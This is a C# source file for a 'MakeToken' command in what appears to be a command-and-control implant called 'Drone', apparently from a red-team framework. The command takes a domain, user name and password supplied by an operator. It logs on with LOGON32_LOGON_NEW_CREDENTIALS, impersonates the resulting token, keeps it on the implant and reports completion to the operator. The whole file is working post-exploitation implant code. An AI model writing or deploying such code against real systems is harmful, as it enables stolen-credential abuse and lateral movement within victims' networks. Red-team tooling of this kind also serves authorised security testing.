using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace Drone.Commands;

using static Interop.Methods;
using static Interop.Data;

public sealed class MakeToken : DroneCommand
{
    public override byte Command => 0x2A;
    public override bool Threaded => false;

    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var split = task.Arguments[0].Split('\\');

        var hToken = LogonUserW(
            split[1],
            split[0],
            task.Arguments[1],
            LOGON_USER_TYPE.LOGON32_LOGON_NEW_CREDENTIALS,
            LOGON_USER_PROVIDER.LOGON32_PROVIDER_WINNT50);

        if (hToken == IntPtr.Zero)
            throw new Win32Exception(Marshal.GetLastWin32Error());
        
        RevertToSelf();

        if (!ImpersonateToken(hToken))
        {
            CloseHandle(hToken);
            throw new Win32Exception(Marshal.GetLastWin32Error());
        }

        Drone.ImpersonationToken = hToken;
        await Drone.SendTaskComplete(task.Id);
    }
}